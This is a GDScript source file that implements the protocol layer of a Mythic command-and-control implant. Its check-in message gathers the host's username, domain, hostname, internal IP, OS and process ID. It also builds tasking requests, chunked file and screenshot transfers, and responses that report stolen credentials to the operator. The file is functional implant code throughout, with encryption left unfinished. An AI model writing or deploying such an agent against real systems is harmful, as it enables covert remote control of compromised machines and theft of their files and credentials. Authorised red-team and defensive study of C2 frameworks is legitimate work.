extends Node

var checkin_done
var uuid_stage
var _config

const UUID_STAGE_PAYLOAD = "payload"
const UUID_STAGE_CALLBACK = "callback"

signal agent_response

func _ready():
	checkin_done = false
	uuid_stage = UUID_STAGE_PAYLOAD
	_config = $".".get_parent().get_node("config")

func checkin():
	checkin_done = true
	uuid_stage = UUID_STAGE_CALLBACK

func get_uuid():
	var uuid

	match uuid_stage:
		UUID_STAGE_PAYLOAD:
			uuid = _config.get_payload_uuid()
		UUID_STAGE_CALLBACK:
			uuid = _config.get_callback_uuid()
		_:
			uuid = false

	return uuid

func get_checkin_payload():
	# https:#docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin
	var username
	if OS.has_environment("USERNAME"):
		username = OS.get_environment("USERNAME")
	else:
		username = "UnknownUserName"

	var userdomain
	if OS.has_environment("USERDOMAIN"):
		userdomain = OS.get_environment("USERDOMAIN")
	else:
		userdomain = ""

	var hostname = OS.get_unique_id()
	if OS.has_environment("COMPUTERNAME"):
		hostname = OS.get_environment("COMPUTERNAME")
	if OS.has_environment("HOSTNAME"):
		hostname = OS.get_environment("HOSTNAME")

	var os = "%s (%s)" % [OS.get_name(), OS.get_model_name()]
	if OS.has_environment("OS"):
		os = OS.get_environment("OS")
	else:
		if OS.has_feature("Windows"):
			os = "Windows"
		elif OS.has_feature("X11"):
			os = "Linux"
		elif OS.has_feature("OSX"):
			os = "Mac"

	var architecture = "Unknown"
	if OS.has_feature("32"):
		architecture = "32"
	if OS.has_feature("64"):
		architecture = "64"
	if OS.has_feature("x86"):
		architecture = "x86"
	if OS.has_feature("x86_64"):
		architecture = "x86_64"

	var ip_adress :String

	if OS.has_feature("Windows"):
		if OS.has_environment("COMPUTERNAME"):
			ip_adress =  IP.resolve_hostname(str(OS.get_environment("COMPUTERNAME")),1)
	elif OS.has_feature("X11"):
		print("X111")
		if OS.has_environment("HOSTNAME"):
			ip_adress =  IP.resolve_hostname(str(OS.get_environment("HOSTNAME")),1)
			print("ip_adress: ", ip_adress)
	elif OS.has_feature("OSX"):
		if OS.has_environment("HOSTNAME"):
			ip_adress =  IP.resolve_hostname(str(OS.get_environment("HOSTNAME")),1)

	var payload = {
		"action": "checkin", # required
		"ip": ip_adress, # internal ip address - required
		"os": os, # os version - required
		"user": username, # username of current user - required
		"host": hostname, # hostname of the computer - required
		"pid": OS.get_process_id(), # pid of the current process - required
		"uuid": get_uuid(), #uuid of the payload - required
		"architecture": architecture, # platform arch - optional
		"domain": userdomain, # domain of the host - optional
		#"integrity_level": 3, # integrity level of the process - optional
		#"external_ip": "8.8.8.8", # external ip if known - optional
		"encryption_key": "", # encryption key - optional
		"decryption_key": "", # decryption key - optional
	}

	return to_json(payload)

func get_tasking_payload():
	var payload = {
		"action": "get_tasking",
		"tasking_size": 2, # TODO: maths - calculate time between call and increase number by some amount?
		"delegates": [],
		"get_delegate_tasks": false,# no p2p for us at this time...
	}

	return to_json(payload)

func create_file_response(task_id, filepath, host, is_screenshot, chunk_count, chunk_size, user_output, status):
	var payload = {
		"task_id": task_id,
		"full_path": filepath,
		"host": host,
		"is_screenshot": is_screenshot,
		"total_chunks": chunk_count,
		"chunk_size": chunk_size,
		"user_output": user_output,
		"status": status
	}

	#return to_json(payload)
	return payload

func upload_file_chunk_request(task_id, filepath, chunk_size, file_id, chunk_num):
	var payload = {
		"upload": {
			"chunk_size": chunk_size,
			"file_id": file_id,
			"chunk_num": chunk_num,
			"full_path": filepath
		},
		"task_id": task_id
	}

	return payload

func create_file_response_chunk(task_id, file_id, chunk_num, data):
	var payload = {
		"chunk_num": chunk_num, 
		"file_id": file_id, 
		"chunk_data": Marshalls.raw_to_base64(data),
		"task_id": task_id
	}

	#return to_json(payload)
	return payload

func create_task_response(status, completed, task_id, output, artifacts = [], credentials = [], unkeyed_payloads = []):
	var payload = {
		"action": "post_response",
		"responses": [],
	}

	var task_response = {
		"task_id": task_id,
		"user_output": output,
		"status": "error",
		"completed": completed,
	}

	if artifacts.size() > 0:
		task_response["artifacts"] = []

		for artifact in artifacts:
			var entry = {}

			entry["base_artifact"] = artifact[0]
			entry["artifact"] = artifact[1]
			task_response["artifacts"].append(entry)

	if credentials.size() > 0:
		task_response["credentials"] = credentials

	for response in unkeyed_payloads:
		payload["responses"].append(response)

	if unkeyed_payloads.size() <= 0:

		if status:
			task_response["status"] = "success"

		payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?

	return to_json(payload)

func unwrap_payload(packet):
	var ret = {
		"action": "",
		"payload": "",
		"uuid": "",
		"status": false
	}

	var data = Marshalls.base64_to_utf8(packet)
	
	print("unwrap payload was: ", data)

	ret["uuid"] = data.substr(0, 36)

	# TODO: decryption
	ret["payload"] = parse_json(data.substr(36))

	if ret["payload"].has("action"):
		ret["action"] = ret["payload"].get("action")

	if ret["payload"].has("status"):
		ret["status"] = ret["payload"].get("status") == "success"

	print("unwrap return: ", ret)

	return ret

func wrap_payload(payload):
	if _config.should_encrypt():
		pass # TODO: implement encryption
	else:
		payload = Marshalls.utf8_to_base64(get_uuid() + payload).to_utf8()

	return payload

func agent_response(payload):
	print("sending payload: ", payload)

	payload = wrap_payload(payload)

	if payload:
		emit_signal("agent_response", payload)
	else:
		print("agent response empty / false : ", payload)


func _on_tasking_post_response(tasks):
	# {"action":"post_response","responses":[{"task_id":"e8e7f996-45db-4ed6-a6ea-2f013c747ef4","status":"success"}]}
	# TODO: keep queue and 'check off' items which are status success from the retry queue?
	print("_on_tasking_post_response: ", tasks)
